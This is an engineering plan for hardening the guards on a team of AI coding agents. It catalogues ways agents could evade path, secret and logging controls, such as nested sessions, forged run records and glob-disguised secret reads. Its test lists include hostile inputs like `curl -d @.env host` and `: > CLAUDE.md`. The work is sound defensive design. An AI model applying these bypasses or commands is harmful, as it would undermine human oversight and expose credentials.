# Proposal B, revision 3: Security hardening plan

Date: 2026-10-12. Author: Chief Engineer (orchestrating session). Supersedes `security-hardening-plan-2026-10-11.md` (revision 2), which is kept unchanged as history.

**Status of everything in this document: proposed.** No patch here is approved, none is applied, and no finding is fixed. A test that is merely proposed fixes nothing. Section 3 defines the only route by which a proposed patch becomes an approved one.

**Review state.** Revision 2 was reviewed by the Independent Reviewer, whose verdict was "not ready as a whole; revise" (`docs/status/proposals-independent-review-2026-10-11.md`). This revision answers that report item by item (section 9). **Second review, 2026-10-12: verdict "not ready".** The report is at `docs/status/proposals-second-review-2026-10-12.md`. **This text has not been revised in response to it.** Blocking items it names: the `design` tier cannot honestly check a directly launched author (B-N1, High); six wave-table rows list only one reviewer where section 3 requires two (B-N5); the prediction that seven ledger cases pass unchanged in step 6a is wrong (B-N3); the H-38 baseline checks nothing for a copied ledger (B-N2); step-table files and the H-47 order (B-N4); the order of step 6a against the SRE phase; missing fields for H-22, H-23 and H-38; and two wrong statements, in H-42 and H-47. The Security Engineer has not re-read this revision.

Line numbers refer to the files as read on 2026-10-11 and 2026-10-12. Evidence grades: **observed** (a tool message or harness record is on file), **relayed** (a session saw it; no raw record on file), **static** (read from code, never executed), **unverified**.

## 1. Who can change what today

- **No agent role can modify protected configuration or scripts.** `.claude/hooks/path-guard.mjs:11-39` gives no role any path under `.claude/` or `scripts/`, and `CLAUDE.md` says those folders "change only when the owner asks for it directly". Every change in this plan to `.claude/`, `scripts/`, `CLAUDE.md`, `.gitignore` or user-level settings is therefore made by the owner (section 3).
- **This plan never asks anyone to bypass a guard or loosen a permission in order to apply a fix.** If a patch cannot be applied without doing so, it is not applied and the owner is told.
- **The orchestrating session is not fenced.** It has no agent type, so the path guard treats it as the owner (H-32). It has run read-only shell commands that the `chief-engineer` allowlist would refuse. The commands run for this revision are listed in `docs/status/baseline-commit-readiness-2026-10-12.md`. No `claude` session was launched from it for this revision.

## 2. Execution paths, considered one by one

Restricting command names is not enough. Each way an agent can act is listed with what controls it today and what this plan proposes.

| Path | Today | Proposed | Still open after the proposal |
|---|---|---|---|
| Shell (Bash) | Allowlist for 3 roles; open for 4 (`path-guard.mjs:45-49`, `:68`); text rules in `settings.json` | Default-deny allowlists (H-01); sandbox for protected paths (H-02); no shell at all for documentation phases | Building roles can still run code they can write (H-01 residual) |
| Write, Edit | Path guard per role (`path-guard.mjs:77-88`); wide lane for `devops-sre` and any-depth patterns for QA | Protected prefixes (H-16); prompt on manifests and executable configs, lockfiles blocked (H-04); link resolution (H-15) | Sessions with no agent type until H-32 is decided |
| Read, Grep, Glob | Name test only (`secret-guard.mjs:37-45`); eight `Read` deny rules; no project boundary | Name test hardened (H-06, H-07); deny rules for home-directory credentials (H-35); content-search probe (H-17) | Reads of unlisted files outside the project |
| Connector and MCP tools | Outside the hook matcher (`settings.json:46`, `:55`), the sandbox and the run log | Owner detaches what is not needed; deny rules for the rest (H-29) | Whatever stays attached |
| Web tools | Not in any agent's tool list (`.claude/agents/*.md:4`); the main session may hold them | No change proposed; listed so it is not assumed away | The main session |
| Starting agents | Only `chief-engineer` lists the agent tool (`chief-engineer.md:4`) | Unknown agent types denied by default (H-31) | — |
| Nested `claude` sessions | Possible from any open shell; the nested session has no agent type | No agent allowlist admits `claude` (H-01); H-32 decides the no-agent-type case | Owner-launched sessions are by design outside this |
| Code run by tools | Package scripts, test files, lint and build configs execute when a script runs | Named scripts only (H-01); configs behind a prompt (H-04) | Residual, accepted or not by the owner |
| Hooks, settings, plugins | Hooks live in the tree they guard; a git-ignored local settings file may outrank project settings (H-34, unverified); a user-level plugin injects instructions | Sandbox write protection (H-02); precedence confirmed (H-34); plumbing protected (H-47) | User-level settings and plugins are the owner's |
| Git hooks and config | `.git/hooks`, `.git/config`, `.gitattributes` unprotected | H-47 | — |

## 3. How a proposed patch becomes an applied one

Statuses, in order: **proposed → tests defined → security-reviewed → reviewer-recommended → owner-approved → applied → verified.** Every change in this plan is at "proposed" today.

1. **Patch text.** The Chief Engineer writes the patch as a unified diff in `docs/status/hardening-patches/<step>-<id>.patch`. A file there is a document, not a change. The owner may instead ask for the diff to be written by anyone else; whoever writes it is not the one who approves it.
2. **Tests.** QA writes the new and changed test cases as a diff to `scripts/test-guards.mjs`, saved under `docs/testing/`, since QA cannot write to `scripts/`. Failing-first: the cases must fail on the current code where the entry says so.
3. **Security Engineer review** of the patch and the tests, written in `docs/security/`. Required for every protected change.
4. **Independent Reviewer** reads the patch, the tests and the security review, and recommends or does not. Required for every protected change. A recommendation is not approval.
5. **Owner approval**, recorded in the step's file under `docs/status/` with the date and the owner's words.
6. **Applied by the owner** at the owner's own terminal, by hand or with `git apply`, on a hardening branch, one step per commit. No agent applies it. If the owner prefers to direct a session to apply it, that is the owner's direct instruction under `CLAUDE.md`, given patch by patch, and the plan records that the applying session was not fenced.
7. **Verified by the owner**: the owner runs `node scripts/test-guards.mjs` and saves the raw output under `docs/testing/evidence/hardening/`. The Independent Reviewer then reads the committed diff with `git show` (admitted by `path-guard.mjs:42`) and the saved output. The reviewer cannot run `node` itself (observed: its allowlist refused `node --version`), so the owner's saved output is the evidence.

Hardening is not done in the same working tree at the same time as the SRE documentation phase.

## 4. Waves

- **Wave 0, testing and verification.** No protected file changes. Probes are launched by the owner; an agent relaying "the owner authorises this" is not authorization. Nothing in Wave 0 is covered by a planning-only authorization: each probe needs the owner's go-ahead.
- **Wave 1, essential hardening before implementation.** Must be applied and verified before any agent holding a shell does real work: scaffold, install, CI, infrastructure or product code.
- **Wave 2, later improvements.** Each entry says what it must precede.

Wave 1 steps, in dependency order. A step starts only when the one before it is verified, except 6a.

| Step | Contents | Files touched | Depends on |
|---|---|---|---|
| 1 | H-12 | `scripts/test-guards.mjs` | Wave 0 item H-46; baseline commit |
| 2 | H-31, H-32, H-08 | `path-guard.mjs`, `secret-guard.mjs` | Step 1; H-22, H-23 results |
| 3 | H-06, H-07 | `secret-guard.mjs`, `settings.json`, `.gitignore` | Step 2 |
| 4 | H-02, H-34, H-47 | `settings.json`, `path-guard.mjs` | Step 3. H-02 is verified before step 5 begins |
| 5 | H-16, H-15, H-01, H-04, H-05, H-35, H-36, then H-03 | `path-guard.mjs`, `settings.json`, one new hook | Step 4 |
| 6a | H-13, H-37, H-38, H-19 | `check-feature-ledger.mjs`, `_TEMPLATE.md`, `SKILL.md` | Step 1 only. May be approved and applied ahead of steps 2 to 5, so the tier exists before the SRE phase is accepted |
| 6b | H-09, H-10, H-11, H-14, H-33, H-49 | `log-agent-run.mjs`, `settings.json`, `check-feature-ledger.mjs`, `.gitignore` | Step 6a and step 5 |
| 7 | H-20, H-24, H-29, H-48 | `settings.json`, `SKILL.md`, `CLAUDE.md` | Step 6b |

**Reconciled wave table.** One row per finding. A finding that needs a probe first and a change later appears once, with both parts stated.

| ID | Finding, short | Severity | Wave.step | Implementer | Reviewers |
|---|---|---|---|---|---|
| H-01 | Shell bypasses path ownership | High | 1.5 | Owner | Security, Reviewer |
| H-02 | No filesystem enforcement | High | 1.4 | Owner | Security, Reviewer |
| H-03 | No detection after the fact | Medium | 1.5 | Owner | Security, Reviewer |
| H-04 | Installs and manifest edits escape approval | High | 1.5 | Owner | Security, Reviewer |
| H-05 | Destructive commands, one spelling | High | 1.5 | Owner | Security, Reviewer |
| H-06 | Secret names: case and globs | High | 1.3 | Owner | Security, Reviewer |
| H-07 | Key formats covered nowhere | Medium | 1.3 | Owner | Security, Reviewer |
| H-08 | Guards fail open | High | 1.2 | Owner | Security, Reviewer |
| H-09 | Direct sessions leave no record | Medium | 1.6b | Owner | Security, Reviewer |
| H-10 | Run record can be fabricated | High | 1.6b | Owner | Security, Reviewer |
| H-11 | Missing log disables the check | High | 1.6b | Owner | Security, Reviewer |
| H-12 | Test suite: vacuous and missing cases | Medium | 1.1 | Owner applies; QA drafts | Security, Reviewer |
| H-13 | No design tier | Medium | 1.6a | Owner | Security, Reviewer |
| H-14 | Probe records satisfy a ledger | Medium | 1.6b | Owner | Security, Reviewer |
| H-15 | Links redirect writes | Medium | 1.5 | Owner | Security, Reviewer |
| H-16 | Patterns reach protected folders | High | 1.5 | Owner | Security, Reviewer |
| H-17 | Content search and secret files | High until probed | 0 probe; 2 change if needed | Owner launches probe | QA records; Security |
| H-18 | Secret protection not observed for every role | Low | 0 | Owner launches probe | QA records |
| H-19 | Ledger evidence and flags unchecked | Medium | 1.6a | Owner | Security, Reviewer |
| H-20 | `ask` becomes refusal non-interactively | Low | 0 probe; 1.7 wording | Owner | Reviewer |
| H-21 | Outstanding role checks | Low | 0 | Owner launches probes | QA records |
| H-22 | Interactive prompts and Chief Engineer tools | Medium | 0 | Owner only | QA records |
| H-23 | New extension session unverified | High | 0 | Owner only | QA records |
| H-24 | Default model unusable | High (operability) | 1.7 | Owner | Reviewer |
| H-25 | No content search for shell-holding roles | Medium | 2 | Owner | Security, Reviewer |
| H-26 | QA cannot capture screenshots | Medium | 2 | Owner decides | Architect, Security |
| H-27 | Figma unreachable from command-line agents | Medium | 0 probe; 2 change if needed | Owner | QA records |
| H-28 | Path rules and full workflow unverified | Low | 0 | QA observes | Reviewer |
| H-29 | Connectors outside every layer | High | 1.7 | Owner | Security |
| H-30 | Rule matching untested | Low | 0 probe; 2 change if needed | Owner launches probe | QA records |
| H-31 | Unknown agent type unrestricted | High | 1.2 | Owner | Security, Reviewer |
| H-32 | No agent type means owner | High | 1.2 | Owner decides and applies | Security, Reviewer |
| H-33 | Ledger check can be redirected | High | 1.6b | Owner | Security, Reviewer |
| H-34 | Local settings may outrank the project | High, unverified | 1.4 | Owner | Security |
| H-35 | Reads outside the project | High | 1.5 | Owner | Security, Reviewer |
| H-36 | `audit fix` admitted | Medium | 1.5 | Owner | Security, Reviewer |
| H-37 | Ledger stage and field bypasses | Medium | 1.6a | Owner | Security, Reviewer |
| H-38 | Design tier is self-declared | Medium | 1.6a | Owner | Security, Reviewer |
| H-39 | Control-trial evidence is relayed (R14) | Medium | 0 | Owner launches | QA records |
| H-40 | Secret guard never seen firing at transcript grade (R15) | Medium | 0 | Owner launches | QA records |
| H-41 | Inaccuracies in the validation record (R18, R19) | Low | 0 | QA, in `docs/testing/` | Reviewer |
| H-42 | Launch argument-order trap | Medium | 0 | Owner | QA records |
| H-43 | Extension registry delay | Medium | 0 | Owner observes | QA records |
| H-44 | Rules untested for other roles | Low | 0 | Owner launches | QA records |
| H-45 | Model of orchestrator and its subagents | Low | 0 | Owner | QA records |
| H-46 | Guard suite never run by an independent party | Medium | 0 | Owner | QA records |
| H-47 | Repository plumbing unprotected | Medium | 1.4 | Owner | Security, Reviewer |
| H-48 | Nothing inspects content before a commit | Medium | 1.7 | Owner | Security |
| H-49 | Fallbacks and missing start time | Low | 1.6b | Owner | Reviewer |
| H-50 | No production credential reachable: unattested | High at launch | 0 | Owner attests | Security |

## 5. Findings register

Each entry: what and where; the proposed change; what still gets through and what may regress; tests before and after; safe verification. Wave, implementer and reviewers are in the table above and are not repeated. "Before" results are predictions from reading the code unless marked observed.

### Guard and path enforcement

**H-01. Shell bypasses path ownership.** Observed: four plain `rm` commands ran with no guard message.
- Where: `path-guard.mjs:45-49` (`BASH_ALLOW` for three roles), `:68` (`if (!allow) process.exit(0)`).
- Proposed: a `BASH_ALLOW` entry for all four building roles. Read-only git as in H-35; `node --version`, `pnpm --version`; and fixed named scripts with no further arguments, of the form `pnpm --filter <own workspace> run <lint|typecheck|test|build>`. No `pnpm exec`, `npx`, `claude`, `rm`, `mv`, `cp`, `ln`, redirection, install or network command. Documentation-only phases launch the role with no shell.
- Still through; regressions: a named script runs whatever the manifest, test files and tool configs say, and these roles can write those. The allowlist narrows the shell; it does not remove the capability and does not confine a role to its lane. The owner accepts this residual risk in writing or does not. Regressions: build steps blocked until listed; no content search for these roles until H-25.
- Tests: for each of the four roles, `rm -r apps`, `mv docs docs.old`, `: > CLAUDE.md`, `pnpm exec prettier --write CLAUDE.md`, `claude -p x`: ALLOW today, BLOCK after. Named script: ALLOW after. Pin: "test file can write outside its lane (documented limit)".
- Safe verification: synthetic suite. Live: one role asked to run `touch _probe.txt`, owner-launched.

**H-02. No filesystem enforcement.** Static.
- Where: `settings.json` has no `sandbox` block.
- Proposed: `sandbox.enabled: true`; `sandbox.allowUnsandboxedCommands: false`, which is load-bearing because the shell tool carries a per-command parameter to leave the sandbox (the reviewer saw it in its own tool schema); an `ask` rule on that parameter; `filesystem.denyWrite` for `.claude/`, `scripts/`, `.github/`, `.git/hooks`, `.git/config`, `.vscode/`, `CLAUDE.md`, every `package.json` and lockfile, and the run log; `filesystem.denyRead` for home-directory credential locations; a stated network policy. Every key must be confirmed on CLI 2.1.231 first; the documentation page read on 2026-10-11 gives minimum versions for some keys, and that page is not on file in this repository.
- Still through; regressions: project-wide, not per role, so it cannot keep `frontend-engineer` out of `apps/api/`. It does not cover Read, Edit, Write, hooks or connectors. Installs fail inside it, which is intended.
- Tests: none in the script suite. Live only.
- Safe verification: QA's procedure L-02, owner-launched, run **before** H-01 is applied, because afterwards the allowlist refuses the probe first and the sandbox would pass without being tested.

**H-03. No detection after the fact.**
- Where: `settings.json:64-73` (one `SubagentStop` hook, which only logs).
- Proposed: a new hook comparing **content hashes** of all files, ignored ones included, between agent start and stop, and reporting any changed path the agent does not own, to the run record and to the owner's saved output, not only to the Chief Engineer.
- Still through: it never audits the main session; two agents at once confuse it; a hook that runs `git` trusts repository git config (H-47 first).
- Tests: owned change clean; unowned change reported; ignored-file change reported; in-lane `.gitignore` change reported.
- Safe verification: temporary repository in a fixture.

**H-04. Installs and manifest edits escape approval.** Static.
- Where: `settings.json:27-28`; `path-guard.mjs:26`, `:32-35` (`devops-sre` owns manifests, `.gitignore`, tooling configs), `:23` (QA owns test-tool configs at any depth).
- Proposed: (1) no agent shell admits any install (H-01). (2) `ask` rules for owner-attended sessions: `pnpm install*`, `pnpm i *`, `pnpm add*`, `pnpm up*`, `pnpm dlx *`, `npm i*`, `npm ci*`, `npx *`, `yarn *`, `bun *`, `corepack *`. (3) In the path guard: lockfiles are **blocked** for every agent; a prompt (the hook's ask decision) for any `package.json`, `.npmrc`, `pnpm-workspace.yaml`, `.gitignore`, `.gitattributes`, `.github/**`, `Dockerfile*`, `deploy/**`, and every config a script executes: `eslint.config.*`, `.prettierrc*`, `tsconfig*.json`, `vite.config.*`, `vitest.config.*`, `playwright.config.*`.
- Still through; regressions: an approved manifest edit followed by an owner-run install is the intended path. Whether a hook's ask decision reaches the owner from a delegated subagent is unverified (H-22). In non-interactive sessions it becomes a refusal.
- Tests: `devops-sre` runs `pnpm install`: ALLOW today, BLOCK after. Writes to `package.json`, `.gitignore`, `eslint.config.js`: silent allow today; ask after, asserted on the hook's output, not its exit code. Lockfile write: BLOCK after.
- Safe verification: synthetic suite; live with `pnpm add --help`, answered "once", never "always" (H-34).

**H-05. Destructive commands covered by one spelling.**
- Where: `settings.json:19` (`Bash(rm -rf *)`).
- Proposed: agents lose file-removing commands through H-01. For owner-attended sessions, `ask` rules for `rm *`, `mv *`, `git rm *`, `find * -delete*`, `find * -exec *`, `truncate *`, `dd *`, `git checkout -- *`, `git restore *`, `git stash drop*`.
- Still through: text rules stay evadable; `: > CLAUDE.md` matches none of them and is stopped only by H-01 and H-02. They are a prompt, not a wall.
- Tests: live probes with help flags, dry runs and paths that do not exist.
- Safe verification: as the trial recorded in the addendum, owner-launched.

**H-15. Links redirect writes.** Static. A pnpm workspace creates links under `node_modules/` with no agent shell involved.
- Where: `path-guard.mjs:81`.
- Proposed: resolve the nearest existing parent with `realpathSync` before computing the relative path.
- Tests: fixture with a link leaving the lane: ALLOW today, BLOCK after.
- Safe verification: temporary directory.

**H-16. Patterns reach protected folders.** Static. Rated High until nested loading is probed, because files under `.claude/agents/` or `.claude/rules/` may load as instructions.
- Where: `path-guard.mjs:21-23` (QA, any depth), `:29-30` (`Dockerfile`, compose, any depth).
- Proposed: one protected-prefix check before the ownership test, case-insensitive, for `.claude/`, `scripts/`, `.git/`, `.github/`, `.vscode/`, `.mcp.json`; and refusal of a nested `CLAUDE.md` or `.claude/` folder inside any lane. Decide whether `devops-sre` may write `apps/*/Dockerfile`.
- Still through: sessions with no agent type, until H-32.
- Tests: `qa-test-engineer` writes `.claude/__tests__/x.mjs`, `.github/__tests__/x.test.ts`; `devops-sre` writes `.claude/Dockerfile.x`; a nested `docs/operations/CLAUDE.md`; a case variant `.Claude/x`: all ALLOW today, BLOCK after.
- Safe verification: synthetic suite.

**H-35. Reads outside the project, and git commands that print any file.** Static.
- Where: `path-guard.mjs:42` (`git diff`, `git show`, `git log` with any arguments); `settings.json:5-12`.
- Proposed: for the git allowlist, reject `--no-index`, `--output`, `-O`, and any argument that is an absolute path, begins with `~`, or contains `..`. Git is understood to compare outside files without any flag when a path lies outside the working tree; that is the reviewer's recollection and is unverified. Add `Read` deny rules and sandbox `denyRead` for home-directory credential locations. State in `CLAUDE.md` that agents read inside the project only.
- Still through: the Read tool on an unlisted file outside the project.
- Tests: `git diff --no-index a b`; `git diff /dev/null /tmp/x`; `git show HEAD:../x`: ALLOW today, BLOCK after.
- Safe verification: synthetic suite. Live confirmation of git's behaviour only on a harmless temporary file, never a credential file.

**H-36. `audit fix` admitted.** Static.
- Where: `path-guard.mjs:48`.
- Proposed: reject any audit command containing `fix`.
- Regressions: none expected.
- Tests: `npm audit fix`, `pnpm audit --fix`: ALLOW today, BLOCK after; `pnpm audit --prod` stays ALLOW.
- Safe verification: synthetic suite.

### Agent identity and fail-safe behaviour

**H-31. Unknown agent type unrestricted.** Static.
- Where: `path-guard.mjs:64`.
- Proposed: when `agent_type` is present and not in `OWNED`, block writes and shell.
- Regressions: built-in agent types lose their shell in this project.
- Tests: `general-purpose` writes a file and runs a command: ALLOW today, BLOCK after.
- Safe verification: synthetic suite.

**H-32. A session with no agent type is treated as the owner.** Static; pinned as intended at `scripts/test-guards.mjs:65`. This session is in that state.
- Where: `path-guard.mjs:63-64`; `settings.json:2`.
- Proposed: owner decision after H-23. (a) Fence such sessions as `chief-engineer`, with an override designed first. An ordinary editor is always available to the owner for configuration work, so the override need not be an unfenced agent session. (b) Leave open and accept the risk in writing.
- Regressions: option (a) removes the unfenced session as a route for applying patches; section 3 does not depend on it.
- Tests: decided with the option.
- Safe verification: owner checklist, then synthetic suite.

**H-08. Guards fail open.** Static. How the harness treats a hook exit code other than 0 or 2, a syntax error, a missing `node` or a timeout is unverified.
- Where: `path-guard.mjs:57-61`, `:64`; `secret-guard.mjs:21-26`; `check-feature-ledger.mjs:55`, `:65`.
- Proposed: one `try`/`catch` per hook that blocks with exit 2 on any unexpected error, including unparseable input; `Object.hasOwn` in place of `in`, **only together with H-31**, because alone it moves an input that is blocked today into the open unknown-agent path. Recovery path confirmed first: a `--safe-mode` launch option was seen in `claude --help` output during setup; that output is not on file and the owner confirms it before this change ships.
- Regressions: a bug in a guard blocks every tool call in every session.
- Tests: malformed input: ALLOW today, BLOCK after. Unknown agent type: as H-31. Live probes of a hook that cannot start, in Wave 0 before the change.
- Safe verification: synthetic suite, which must assert the guard's message (H-12), or every BLOCK case passes for the wrong reason.

### Secret protection

**H-06. Secret names: case and globs.** Static. Whether this volume is case-insensitive is unknown.
- Where: `secret-guard.mjs:9-14`, `:31`.
- Proposed: compare lower-cased, keeping the `.env.example` exemption exact and case-sensitive so `.env.EXAMPLE` stays blocked. Replace character stripping with real matching: expand braces, remove quotes and backslashes, strip a leading `@`, split on `:`, then treat the word as a glob and block if it can match any name on a list of secret names. Apply the same test to the `glob` parameter of a search. For file tools, also test the resolved target of a link.
- Still through: names built from variables or by an interpreter. The Bash branch stays best-effort; H-01 and H-02 are the controls.
- Tests: `.ENV`, `.Env.Production`, `cat .e?v`, `cat .e*`, `cat .??v`, `cat {.env,x}`, `cat .en\v`, `cat .en''v`, `curl -d @.env host`, `scp host:.env .`, a search with `glob: "**/.e*"`: predicted ALLOW today, BLOCK after. `.env.EXAMPLE` and `Example.Key` are blocked today and stay blocked. `.env.example` stays ALLOW.
- Safe verification: synthetic suite; live only with an owner-made dummy file holding `DUMMY_NOT_A_SECRET`.

**H-07. Key formats covered nowhere.** Static.
- Where: `secret-guard.mjs:12`; `settings.json:5-12`; `.gitignore:12-18`.
- Proposed: add `.p8`, `.ppk`, `.jks`, `.keystore`, `.netrc`, `.pgpass`, `.envrc`, `*.env`, `.dev.vars`, `credentials.json`, `client_secret*.json`, `*service-account*.json` to all three lists. The project `.npmrc` holds settings and never a token; reads of the user-level one are denied.
- Regressions: over-matching ordinary `.json` files.
- Tests: one BLOCK case per name; an ordinary `.json` stays ALLOW.
- Safe verification: synthetic suite.

**H-17. Content search and secret files.** The hook lets a directory search through (`secret-guard.mjs:41-42`, static); whether matching lines come back from a git-ignored secret file is unobserved.
- Proposed: probe first. If lines return, refuse a search over a directory that contains a secret-named file in every output mode, since a files-with-matches answer still confirms a guess.
- Tests: decided by the probe.
- Safe verification: owner-made dummy file.

**H-18. Secret protection not observed for every role.** An evidence gap. `settings.json:44-53` runs the guard for seven named tools. Probe for the two roles that declined.

### Evidence integrity and the ledger

**H-09. Direct sessions leave no record.** Observed: the session that wrote the validation record has no entry.
- Where: `settings.json:64-73`; `log-agent-run.mjs:14`.
- Proposed: also log on a session-level event, to be confirmed on 2.1.231, with `kind: "direct"`. Whether a direct record may count toward a ledger stage is an owner decision; the proposal is yes, only together with an owner-saved session file (section 6).
- Tests: synthetic payloads for both kinds.
- Safe verification: one trivial owner-launched session, then read the log.

**H-10. Run record can be fabricated.** Static. A Write to the log is already blocked for the ten named roles, since no `OWNED` pattern matches it; the open routes are a shell and a session with no agent type.
- Where: `log-agent-run.mjs:26`; `.gitignore:26`.
- Proposed: H-01 and H-02 close the shell route. Stop ignoring the log so every change to it appears in `git diff` and enters history when the owner commits. Optionally chain records, each carrying the hash of the line before, so an edit to an earlier line is evident. State in `CLAUDE.md` that the log corroborates and never proves. Signing is not proposed: an agent that can read the hook can read its key.
- Still through: an unfenced session.
- Tests: Write to the log by a named agent: BLOCK today and after (regression pin). Shell append by a building role: ALLOW today, BLOCK after H-01.
- Safe verification: synthetic suite. No live append.

**H-11. Missing log disables the check.** Static, read the same way by QA and the reviewer.
- Where: `check-feature-ledger.mjs:27`, `:76`, `:104`.
- Proposed: a missing log with any ticked agent stage is a failure, exit 1. No flag switches this off.
- Tests: ticked stage with no log: exit 0 today, exit 1 after.
- Safe verification: temporary fixtures; the real log is never touched.

**H-14. Probe records satisfy a ledger.**
- Where: `check-feature-ledger.mjs:24`, `:77`.
- Proposed: each ticked stage carries `run: <agentId>`; the check requires that record to exist for the same agent, dated on or after `started`, non-null, used by one stage only. This changes the existing case at `scripts/test-guards.mjs:134`.
- Still through: a trivial delegation after `started` produces a genuine id. The binding proves a run by that agent ended, not what it did. Evidence files and the reviewer are the check on substance.
- Tests: unknown id, probe-dated id, reused id, null id: each fails after.
- Safe verification: temporary fixtures.

**H-33. Ledger check can be redirected or starved.** Static.
- Where: `check-feature-ledger.mjs:17-18`, `:98-100`, `:106`; `path-guard.mjs:46`.
- Proposed: the allowlist admits the command with no arguments only; the script prints the absolute log and ledger paths it used; a missing ledger folder is a failure; a ledger file beginning with `_` other than `_TEMPLATE.md`, or sitting in a subfolder, is reported and fails. The `--no-run-log` flag from the first draft is withdrawn.
- Tests: `--log x` and `--dir x` from the Chief Engineer: ALLOW today, BLOCK after. `_F-001.md` accepted with no stages: `ok` today, FAIL after.
- Safe verification: synthetic suite and fixtures.

**H-37. Ledger stage and field bypasses.** Static.
- Where: `check-feature-ledger.mjs:24`, `:49`, `:54`, `:76`, `:82`, `:84`, `:85`, `:90`.
- Proposed: a fixed table of which agents may hold each stage, `owner` valid only for `plan-approved`; at least one known agent per stage; every header field required; keys exactly as in the template; values exactly `yes` or `no`; anything else fails.
- Tests: `security | agent: owner`; `agent: ,`; `Accepted: yes`; `accepted: Yes`; missing `security-sensitive`: each `ok` or ignored today, FAIL after.
- Safe verification: fixtures.

**H-13 and H-38. Design tier.** See section 6.

**H-19. Ledger evidence and flags unchecked.** Static.
- Where: `check-feature-ledger.mjs:74`, `:84-85`, `:24`.
- Proposed: evidence beginning with a repository path must exist; `security-sensitive: no` needs a justification line; any ticked line not matching the stage format is reported.
- Tests: three failing cases, then passing.
- Safe verification: fixtures.

**H-49. Fallbacks and missing start time.** Static.
- Where: `path-guard.mjs:80`, `log-agent-run.mjs:16` (fall back to the session's working directory); the log record has no start time.
- Proposed: fail closed when the project directory variable is unset; record a start time, which also lets concurrent writers be seen.
- Tests: unset variable: BLOCK after.
- Safe verification: synthetic suite.

**H-12. Test suite repairs.**
- Where: `scripts/test-guards.mjs:82` (vacuous case), `:65` (pins the open main session), `:20-24` (`expect` compares exit status only).
- Proposed: assert the guard's message as well as the exit code; helpers for raw input, captured output and per-test logs; rename the vacuous case as a documented limit; add a pin for each known limit.
- Tests: the count rises from 58; the new count is recorded when the owner runs it.
- Safe verification: the suite itself, run by the owner.

### Permissions, capabilities, model and integrations

**H-20.** `ask` rules become refusals in non-interactive sessions (observed). No rule change. The procedure text, that approved installs, merges and pushes are run by the owner, goes into the workflow skill, which is a protected file, at step 1.7.

**H-21.** Outstanding role checks: live write denial for `software-architect`; any write attempt by `independent-reviewer`; secret-read refusal for `backend-data-engineer` and `independent-reviewer`. Owner-launched probes; at most one `_probe-*.txt` file each.

**H-22.** Interactive prompts and the Chief Engineer's plan and question tools are unverified. Owner-only checklist in QA's plan. If the tools are absent, approval is given in the conversation and quoted in the ledger.

**H-23.** A new extension session starting as `chief-engineer`, loading `CLAUDE.md`, and being fenced: unverified. Owner only. Its result decides H-32.

**H-24.** The default model fails: observed, "Fable 5 requires usage credits". No `model` key in `settings.json`; no `model:` line in any agent file. Proposed: `"model": "opus"` in project settings. On CLI 2.1.231 the alias resolved to `claude-opus-5` (observed). Test: one owner-launched session with no model flag, reading the model from its output.

**H-25. No content search for shell-holding roles.** Observed in start-up records: roles holding a shell are given no search tools.
- Where: `.claude/agents/*.md:4`; `path-guard.mjs:41-49`.
- Proposed, owner chooses: (a) once commits exist, admit `git grep` on tracked files only, rejecting `--no-index`, `--no-exclude-standard`, `-O` and `--open-files-in-pager`, plus `ls`; or (b) launch the role without a shell when the task needs search and not git. That a no-shell launch grants search tools is relayed, not on file. Not proposed: `find`, `rg`, recursive `grep`. Separately: whether the reviewer may run the two fixed scripts.
- Tests: `git grep -n x`: BLOCK today, ALLOW after under (a); `git grep --no-index x` and `git grep -O x`: BLOCK before and after.
- Safe verification: synthetic suite; a live search for a word in `CLAUDE.md`.

**H-26.** QA has no screenshot tool (`qa-test-engineer.md:4`, `:15`). Owner decision among a browser-automation dependency, a browser connector in an attended session, or owner-captured screenshots. Abuse: a browser tool is a network path and a new dependency. Test: one captured screenshot of a known page. Before the first UI feature.

**H-27.** Figma was not reachable from command-line agents (observed twice). No change until the owner supplies a file. Probe: read-only call on one frame from an attended session. Abuse: a connector that can also write. Pass: frame metadata returned to `da-vinci`.

**H-28.** Path-scoped rules and the full workflow are unverified. Pass condition: the first ledger records, for each rule file, whether it was seen to load, with the session output saved.

**H-29. Connectors outside every layer.** Observed attached to agent sessions; agents ignored their instruction text in every run seen.
- Where: the hook matchers at `settings.json:46` and `:55` name built-in tools only.
- Proposed: the owner detaches connectors this project does not need; `deny` rules for the tool prefixes of any that remain and can write or spend; the hook matcher extended to connector tool names so calls are at least logged.
- Abuse: hostile text in a file telling an agent to call a connector; spend on a credit-metered connector.
- Tests: a start-up record showing no connector tools for agent sessions.
- Safe verification: read the record; call nothing.

**H-30.** How the `Read` deny patterns match, whether shell patterns normalise whitespace, and whether `Read(*.pem)` fires: untested. Probes on paths that do not exist.

**H-34.** `.claude/settings.local.json` is git-ignored (`.gitignore:29`) and is understood to outrank project settings; unverified. It did not exist on 2026-10-11 (the reviewer's read). Proposed: confirm precedence; answer prompts "once", never "always"; list the file in every acceptance check; consider tracking it.

**H-47. Repository plumbing unprotected.** Static.
- Where: no rule covers `.git/config`, `.git/hooks/`, `.gitattributes`, `.vscode/`, `.mcp.json`.
- Proposed: add them to the protected prefixes (H-16) and the sandbox deny list (H-02).
- Abuse: a changed git config makes an ordinary `git status` run a program, including one run by a hook.
- Tests: writes to each: ALLOW today for the owning role or a shell, BLOCK after.
- Safe verification: synthetic suite.

**H-48. Nothing inspects content before a commit.** Secret protection is by file name only.
- Proposed: a written pre-commit check the owner runs, and later a scanner if the owner approves a dependency. The baseline readiness report applies the check by hand this once.
- Tests: the check finds a planted marker string in a fixture.
- Safe verification: marker string, never a real secret.

### Evidence and verification items added in revision 3

**H-39 (R14).** The control trial showing that unmatched commands run after refusals is relayed; its raw output is not on file, and behaviour without a command-line allowance is unknown. Owner re-runs it and saves raw output.

**H-40 (R15).** The secret guard has been seen firing only in the orchestrating session's own tool results, twice, neither on file. Owner-launched capture for the shell branch and, with a dummy file, the file-tool branch.

**H-41 (R18, R19).** In `docs/testing/setup-validation.md`: a heading that conflates two fences; a model statement graded above its evidence; an addendum copy typed out by hand, since compared and found identical by the orchestrating session; and a final section never reviewed. QA corrects these in its own lane.

**H-42.** A prompt placed directly after an option that takes several values is swallowed (observed for `--allowedTools`; unverified for `--disallowedTools`). Every launch form in both proposals puts the prompt last, after a single-value option. Owner capture confirms.

**H-43.** The extension showed the project agents only after a delay (relayed). Owner observes in a new session.

**H-44.** `ask` and `deny` rules were exercised for `devops-sre` only. Owner-launched harmless probes for one other role.

**H-45.** The model of the orchestrating session and of subagents started from it rests on self-report. Owner reads the model selector and records it.

**H-46.** Nobody independent has seen the guard suite pass. The owner runs `node scripts/test-guards.mjs` and saves the raw output before anything else in this plan.

